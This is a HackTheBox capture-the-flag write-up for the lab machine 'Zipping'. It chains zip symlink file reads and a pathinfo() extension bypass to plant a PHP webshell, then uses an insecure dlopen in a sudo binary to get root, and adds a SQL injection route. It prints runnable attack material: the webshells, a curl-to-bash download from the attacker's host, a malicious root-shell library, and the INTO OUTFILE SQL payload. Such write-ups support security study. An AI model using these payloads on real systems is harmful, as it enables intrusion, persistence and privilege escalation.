---
layout: post
title: "HTB: Zipping"
subtitle: "A zip symlink read upload.php source, a pathinfo extension bypass dropped a webshell, then a sudo binary that dlopens a home-path .so gave root"
date: 2023-08-29
tags: [htb, linux, file-upload, sudo, privilege-escalation]
category: writeups
kind: machine
tldr: "An upload form 7z-extracted a PDF from a zip. A zip symlink gave arbitrary file read of the upload handler's source, which showed the extension check was just a pathinfo() comparison. A filename like x.phpg.pdf bypassed it and dropped a runnable .php webshell as rektsu. Root came from a NOPASSWD sudo binary that dlopen's a .so from my home config, so a malicious library with a constructor ran as root."
---

## the box

Zipping is a medium Linux box from HackTheBox. It runs OpenSSH 9.0p1 (Ubuntu 1ubuntu7.3) and Apache 2.4.54 on Ubuntu 23.04. The site is a watch store, and the page that matters is `/upload.php`, a "submit your resume" form that takes a zip and extracts a single PDF from it. A handler that accepts a zip and extracts files is a magnet for two classic bugs: zip symlink read and extension-check bypass. Zipping has both.

The path I took: read the upload handler's own source with a zip symlink, see that the "is it a PDF" check is a sloppy `pathinfo()` comparison, abuse that to drop a runnable PHP webshell, land a shell as `rektsu`, then escalate through a NOPASSWD sudo binary that loads a shared object from a path inside my own home directory. There is also a second, fully separate foothold through a UNION SQL injection in the shop, which I cover at the end.

## recon

Full TCP scan, then versioned scan on the open ports:

```bash
nmap -p- --min-rate 10000 -T4 10.129.102.182
nmap -p 22,80 -sCV 10.129.102.182
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

OpenSSH 9.0p1 and Apache 2.4.54 place this on Ubuntu 23.04, newer than the usual HTB image, but the versions themselves are not vulnerable. Content discovery on port 80 turned up the shop and the upload page:

```
/uploads (Status: 301)
/shop    (Status: 301)
/assets  (Status: 301)
```

```
http://10.129.102.182/upload.php
```

The upload page said it only accepts zip files that contain a single PDF resume. That is the "zip in, extract out" pattern, so I started there with the two go-to techniques. The blog posts I leaned on were `effortlesssecurity.in/zip-symlink-vulnerability/` and the "zip-based exploits" gitconnected article.

## foothold

I went for source disclosure first with a zip symlink. The idea is to put a symlink inside the archive whose target is a file on the server, preserve the link with `zip --symlinks`, and let the server's extraction follow it. The default single-level traversal payload from the blog posts did not work, so I used a doubled-up `....//` traversal as the symlink target, which survives a single round of naive `../` stripping, and zipped it preserving the link:

```bash
ln -s ....//....//....//....//....//....//....//etc/passwd lol.pdf
zip -r --symlinks lma.zip lol.pdf
```

I uploaded `lma.zip`, then browsed the extracted path the page handed back. The server followed the symlink and served `/etc/passwd`, which confirmed arbitrary file read:

```
root:x:0:0:root:/root:/bin/bash
...
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

`rektsu` was the only human user. The `_laurel` account is the auditd userland logger again, so the box is recording activity.

The same trick reads source. I pointed the symlink at the upload handler itself:

```bash
ln -s ....//....//....//....//....//....//....//var/www/html/upload.php a.pdf
zip -r --symlinks demo.zip a.pdf
```

The returned source showed the whole logic, and the extension check was the weak point:

```php
$zip = new ZipArchive;
if ($zip->open($zipFile) === true) {
  if ($zip->count() > 1) {
    echo '<p>Please include a single PDF file in the archive.<p>';
  } else {
    // Get the name of the compressed file
    $fileName = $zip->getNameIndex(0);
    if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
      mkdir($uploadDir);
      echo exec('7z e '.$zipFile. ' -o' .$uploadDir. '>/dev/null');
      echo '<p>File successfully uploaded and unzipped ...';
    } else {
      echo "<p>The unzipped file must have  a .pdf extension.</p>";
    }
  }
}
```

`pathinfo($fileName, PATHINFO_EXTENSION)` returns only the substring after the final dot. So `test.phpg.pdf` has extension `pdf` and passes the check. But Apache's PHP handler matches on `.php` appearing anywhere in the dotted name, not just at the end:

```
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
```

That mismatch is the bug. A name like `x.php<anything>.pdf` clears PHP's `pathinfo` check and still gets executed as PHP by Apache, as long as the `.php` segment is matched. I first tried the older null-byte route, packing `rev.php0.pdf` and hex-editing the `%00` into the archive's central directory to truncate the name at the null. That did not work on this PHP version. Switching to the single-extra-character form, `test.phpg.pdf`, did. I packed a webshell under that name:

```php
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```

```bash
zip pop.zip rev.phpg.pdf
```

Uploading it, then browsing the extracted file with a `?cmd=` parameter, gave command execution as `rektsu` (the Apache worker runs as `rektsu` on this box). I used that to pull and run a one-liner that dropped my SSH key into `authorized_keys`:

```bash
curl http://10.10.14.4:8000/shell.sh | bash
```

```bash
# shell.sh
echo "ssh-rsa AAAAB3NzaC1yc2E...exasecu@exasecu" >> /home/rektsu/.ssh/authorized_keys
```

## user

With my key in `authorized_keys` I logged in over SSH as `rektsu`:

```bash
ssh -i id_rsa rektsu@10.129.102.182
```

The user flag was in the home directory. A reverse shell over `/dev/tcp` works the same way, but a key gives a stable session for the privesc enumeration.

## root

sudo first. One NOPASSWD entry stood out:

```bash
sudo -l
```

```
User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

`stock` is a small custom ELF, so I pulled it back and looked at it. checksec showed a normal modern binary, not a memory-corruption target:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

It prompts for a password and, on success, drops into a stock-management menu reading `/root/.stock.csv`. The decompiled `checkAuth` compared the input against a hardcoded string:

```c
bool checkAuth(char *param_1)
{
  int iVar1;
  iVar1 = strcmp(param_1,"St0ckM4nager");
  return iVar1 == 0;
}
```

So the password is `St0ckM4nager`. There is no empty return, no overflow, nothing in the menu logic to abuse. But right after the password check, `main` decrypts a small buffer with an `XOR` routine and passes the result to `dlopen`:

```c
local_e8 = 0x2d17550c0c040967;
local_e0 = 0xe2b4b551c121f0a;
local_d8 = 0x908244a1d000705;
local_d0 = 0x4f19043c0b0f0602;
local_c8 = 0x151a;
local_f0 = 0x657a69616b6148;          // "Hakaize" key bytes
XOR((long)&local_e8,0x22,(long)&local_f0,8);
local_28 = dlopen(&local_e8,1);
```

Rather than reverse the XOR by hand, I let strace tell me exactly what path it tries to load:

```bash
strace /usr/bin/stock
```

```
write(1, "Enter the password: ", 20)   = 20
read(0, "St0ckM4nager\n", 1024)        = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

The binary loads `libcounter.so` from a path inside my own home, and that file does not exist. That is an insecure `dlopen` against a user-writable location. Any shared object I plant there gets loaded into a process running as root under sudo, and a library constructor runs the moment the object is loaded, before any of the menu code:

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

I compiled it as a position-independent shared object without the default startup files (so my `_init` is the one that fires), placed it at the expected path, and ran the sudo binary:

```bash
mkdir -p /home/rektsu/.config
gcc -shared -nostartfiles -o /home/rektsu/.config/libcounter.so -fPIC exploit.c
sudo /usr/bin/stock
```

After entering `St0ckM4nager`, the `dlopen` pulled in my library, the constructor fired as root, and I had a root shell to read the root flag:

```
Enter the password: St0ckM4nager
root@zipping:/home/rektsu/.config# id
uid=0(root) gid=0(root) groups=0(root)
```

(Using the `__attribute__((constructor))` form instead of `_init` works identically, and lets you drop `-nostartfiles`.)

## the other foothold

There is a second, independent way to `rektsu` through the shop, worth walking because the filter bypass is clean. `/shop/product.php` takes an `id` parameter and tries to validate it as numeric with a regex before building the query:

```php
if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
  header('Location: index.php');
} else {
  $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
}
```

The query is built by string concatenation, so it is injectable, but the regex is supposed to reject anything that is not a clean integer. The flaw is the anchors. `^.*` matches only up to the first newline, and the alternation's right side `[^0-9]$` only checks the very last character. A payload that puts a newline first, then keeps everything after it numeric-looking at the boundaries, slides past both halves of the pattern. URL-encoding a leading `%0A` is the key.

With the filter bypassed it is a UNION injection. The MySQL user has the `FILE` privilege, which means `INTO OUTFILE` can write to disk. I wrote a webshell into a world-writable location:

```
id=%0A100' union select "<?php system($_REQUEST['cmd']); ?>",2,3,4,5,6,7,8 into outfile "/dev/shm/shell.php"-- -
```

`/dev/shm` is writable and the column count matches the products table. From there the shop's page-include parameter loads it and appends `.php`, executing the shell:

```
/shop/index.php?page=/dev/shm/shell
```

That reaches the same `rektsu` execution by a completely different door, no upload involved.

## takeaway

The upload chain is two weak checks stacked. A zip extractor that follows symlinks is arbitrary file read, which handed me the handler source for free and made everything after it easy. And `pathinfo(..., PATHINFO_EXTENSION)` only ever looks at the final extension, so it is not a real upload filter, especially when Apache treats `.php` anywhere in the dotted name as executable. The fix is to match the server's own rule: reject any name containing `.php` (or `.phar`, `.phtml`), not just one that fails to end in `.pdf`.

The root step was a textbook insecure `dlopen`: a setuid-via-sudo binary loading a library from a user-controlled path is just code execution with extra steps, and the XOR-obfuscated path bought nothing once strace printed it. The SQL injection is a reminder that a regex around a query is not parameterization. The query was even using a prepared statement object, but the value was concatenated into the SQL string before binding, so the `prepare` was decorative. Binding the `id` as a real parameter would have closed it regardless of the regex.
